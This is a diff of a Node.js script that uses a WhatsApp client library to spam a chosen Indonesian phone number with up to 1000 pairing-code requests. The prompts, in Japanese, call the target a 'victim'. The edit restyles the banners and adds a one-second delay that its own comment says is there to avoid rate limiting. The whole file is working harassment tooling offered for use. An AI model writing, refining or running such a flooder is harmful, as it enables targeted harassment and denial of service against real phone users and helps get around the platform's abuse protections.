@@ -2,39 +2,33 @@ const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysocket
 const pino = require('pino');
 const readline = require("readline");
 
+// Stylish color scheme
 const colors = {
-    reset: '\x1b[0m',
     red: '\x1b[31m',
-    darkRed: '\x1b[31;1m',
-    black: '\x1b[30m',
-    white: '\x1b[37m',
-    darkGray: '\x1b[90m',
-    bgBlack: '\x1b[40m',
-    bgRed: '\x1b[41m',
-    bold: '\x1b[1m',
+    green: '\x1b[32m',
+    yellow: '\x1b[33m',
+    blue: '\x1b[34m',
+    magenta: '\x1b[35m',
+    cyan: '\x1b[36m',
+    reset: '\x1b[0m'
 };
 
-const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+const getRandomColor = () => {
+    const colorKeys = Object.keys(colors).filter(key => key !== 'reset');
+    return colors[colorKeys[Math.floor(Math.random() * colorKeys.length)]];
+};
 
-function question(text) {
-    return new Promise(resolve => rl.question(text, resolve));
-}
+const mainColor = getRandomColor();
+const accentColor = colors.magenta;
 
-function printHeader() {
-    console.clear();
-    console.log(colors.bgBlack + colors.red + colors.bold);
-    console.log("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓");
-    console.log("┃                                            ┃");
-    console.log("┃    ＬＵＣＩＦＥＲ　Ｘ　ＳＡＴＡＮＩＣ    ┃");
-    console.log("┃       スパムペアリングコードツール         ┃");
-    console.log("┃                                            ┃");
-    console.log("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛");
-    console.log(colors.reset);
-}
+const question = (text) => {
+    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+    return new Promise((resolve) => { rl.question(text, resolve) });
+};
 
-async function spamPairing() {
-    const { state } = await useMultiFileAuthState('./69/session');
-    const luciferBot = makeWASocket({
+async function LuciferXSatanic() {
+    const { state } = await useMultiFileAuthState('./lucifer/session');
+    const SatanicBot = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
         auth: state,
@@ -46,56 +40,82 @@ async function spamPairing() {
         generateHighQualityLinkPreview: true,
         syncFullHistory: true,
         markOnlineOnConnect: true,
-        browser: ["HAZEL X SATANIC", "Chrome", "20.0.04"],
+        browser: ["Hell", "Firefox", "666.6.6"],
     });
 
     try {
-        const phoneNumber = await question(colors.red + "対象番号 (+62で始まる): " + colors.reset);
+        console.log(mainColor + '┌───────────────────────────────────┐');
+        console.log('│ 地獄からの招待状 - 悪魔の招待システム │');
+        console.log('└───────────────────────────────────┘' + colors.reset);
+        
+        const phoneNumber = await question(accentColor + '犠牲者の電話番号 (+62xxxxxxxxxx): ' + colors.reset);
+        
+        const spamCount = parseInt(await question(accentColor + '地獄の招待状の数 (1-1000): ' + colors.reset));
 
-        let totalSpamRaw = await question(colors.red + "スパム回数 (1〜1000): " + colors.reset);
-        const totalSpam = parseInt(totalSpamRaw);
-
-        if (isNaN(totalSpam) || totalSpam <= 0 || totalSpam > 1000) {
-            console.log(colors.red + "無効な入力です。例: 20" + colors.reset);
+        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 1000) {
+            console.log(colors.red + 'エラー: 有効な数字を入力してください (1-1000)' + colors.reset);
             return;
         }
 
-        for (let i = 0; i < totalSpam; i++) {
+        console.log(mainColor + '\n┌─────────────────────────────┐');
+        console.log('│ 悪魔の仕事を開始します... │');
+        console.log('└─────────────────────────────┘\n' + colors.reset);
+
+        for (let i = 0; i < spamCount; i++) {
             try {
-                let code = await luciferBot.requestPairingCode(phoneNumber);
+                let code = await SatanicBot.requestPairingCode(phoneNumber);
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(colors.darkRed + `成功！ペアリングコード送信中: ${phoneNumber} [${i + 1}/${totalSpam}]` + colors.reset);
-            } catch (err) {
-                console.error(colors.red + 'エラー: ' + err.message + colors.reset);
+                console.log(mainColor + `[${i + 1}/${spamCount}] ` + accentColor + 
+                    `地獄からの招待状を送信しました → ${phoneNumber}` + colors.reset);
+                
+                // Add some delay to avoid rate limiting
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            } catch (error) {
+                console.error(colors.red + `エラー: ${error.message}` + colors.reset);
             }
         }
-    } catch (err) {
-        console.error(colors.red + "エラーが発生しました。" + colors.reset);
+
+        console.log(mainColor + '\n┌─────────────────────────────┐');
+        console.log(`│ 完了! ${spamCount}回の招待状を送信 │`);
+        console.log('│    LUCIFER X SATANIC      │');
+        console.log('└─────────────────────────────┘\n' + colors.reset);
+
+    } catch (error) {
+        console.error(colors.red + '致命的なエラー:' + colors.reset, error.message);
     }
+
+    return SatanicBot;
 }
 
-async function mainMenu() {
-    printHeader();
+// ASCII Art Banner
+console.log(mainColor + `
+███████╗██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
+██╔════╝██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
+█████╗  ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
+██╔══╝  ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
+██║     ╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
+╚═╝      ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
+` + accentColor + `
+ ██████╗ ██╗   ██╗████████╗███████╗██████╗ ███████╗
+██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝
+██║   ██║██║   ██║   ██║   █████╗  ██████╔╝███████╗
+██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗╚════██║
+╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║███████║
+ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
+` + colors.reset);
 
-    console.log(colors.red + "メニュー:");
-    console.log("  1. スパムペアリングコードを開始する");
-    console.log("  2. 終了する" + colors.reset);
+console.log(mainColor + `
+地獄からのメッセージ:
+───────────────────────────────────
+このツールは悪魔の力で動作します
++62の番号にのみ有効です
+不正使用は地獄行きです
+───────────────────────────────────
+` + accentColor + `
+使用方法:
+1. ターゲットの電話番号を入力
+2. 送信する招待状の数を入力
+3. 地獄の門が開くのを待つ
+` + colors.reset);
 
-    const choice = await question(colors.red + "選択してください (1/2): " + colors.reset);
-
-    if (choice === '1') {
-        await spamPairing();
-        await new Promise(r => setTimeout(r, 2000));
-        await mainMenu();
-    } else if (choice === '2') {
-        console.log(colors.red + "ご利用ありがとうございました。さようなら。" + colors.reset);
-        rl.close();
-        process.exit(0);
-    } else {
-        console.log(colors.red + "無効な選択です。もう一度試してください。" + colors.reset);
-        await new Promise(r => setTimeout(r, 2000));
-        await mainMenu();
-    }
-}
-
-mainMenu();
+LuciferXSatanic();
